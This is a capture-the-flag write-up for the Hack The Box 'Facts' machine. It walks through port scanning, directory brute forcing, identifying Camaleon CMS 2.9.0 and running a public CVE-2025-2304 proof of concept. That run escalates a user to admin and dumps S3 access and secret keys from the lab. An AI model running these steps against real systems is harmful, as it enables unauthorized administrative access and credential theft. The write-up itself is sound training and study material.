# factsHTB
Writeup of the seasonal Facts Hack the Box machine


Initial nmap scan of the machine reveals 2 PoA being a HTTP site and SSH service being hosted.

```
┌──(root㉿kali-linux-2024-2)-[/]
└─# nmap -sV -sC 10.129.4.222
Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-16 22:56 -0600
Nmap scan report for 10.129.4.222
Host is up (0.24s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.9p1 Ubuntu 3ubuntu3.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 4d:d7:b2:8c:d4:df:57:9c:a4:2f:df:c6:e3:01:29:89 (ECDSA)
|_  256 a3:ad:6b:2f:4a:bf:6f:48:ac:81:b9:45:3f:de:fb:87 (ED25519)
80/tcp open  http    nginx 1.26.3 (Ubuntu)
|_http-title: Did not follow redirect to http://facts.htb/
|_http-server-header: nginx/1.26.3 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.28 seconds
```

Going to the website we find a trivia website -- nothing special however further enumeration with DirBuster shows us a hidden directory:

```
Starting dir/file list based brute forcing
Dir found: /admin/forgot/ - 200
Dir found: / - 200
Dir found: /admin/ - 302
File found: /admin/login - 200
Dir found: /randomfacts/ - 403
File found: /admin/forgot - 200
Dir found: /.bash_history/ - 200
Dir found: /.bashrc/ - 200
File found: /welcome - 200
```

None of these are significant besides one `/admin/login` going to that webpage we see a login with a sign up page.

Creating an account lets us analyze the behind the scenes of the website. Though we have an account there is no real access but -- scanning the page we see the backend is running `Copyright © 2015 - 2026 Camaleon CMS. Version 2.9.0`

Research on `Camaleon v2.9.0 CVE` on google brings up [`CVE-2025-2304`](https://github.com/advisories/GHSA-rp28-mvq3-wf8j). Analysis of this CVE tells us that there is a severe vulnerability with the permit! function within the source code. Improper input validation allows for privilege escalation. Read more at the link above.

We can look up the CVE with the attatched keywords of 'github' or 'POC' and find [`Alien0ne CVE-2025-2304`](https://github.com/Alien0ne/CVE-2025-2304) proof of concept. We can then clone the repository and execute using the required parameters.

**NOTE** Its important that if you want to remain admin -- vim into the `exploit.py` file and comment out the user role revert function to log back in after running the exploit.

```
┌──(root㉿kali-linux-2024-2)-[/home/parallels/Documents/FactsHTB/CVE-2025-2304]
└─# python3 exploit.py -u http://facts.htb -U tesst -P tesst123 -e
[+]Camaleon CMS Version 2.9.0 PRIVILEGE ESCALATION (Authenticated)
[+]Login confirmed
   User ID: 7
   Current User Role: client
[+]Loading PPRIVILEGE ESCALATION
   User ID: 7
   Updated User Role: admin
[+]Extracting S3 Credentials
   s3 access key: AKIA16757E1D3F983CD0
   s3 secret key: Bg+Q58iwL1BhDD9HOsiQk6Tml1qTrH3RM0pXcv/q
   s3 endpoint: http://localhost:54321
```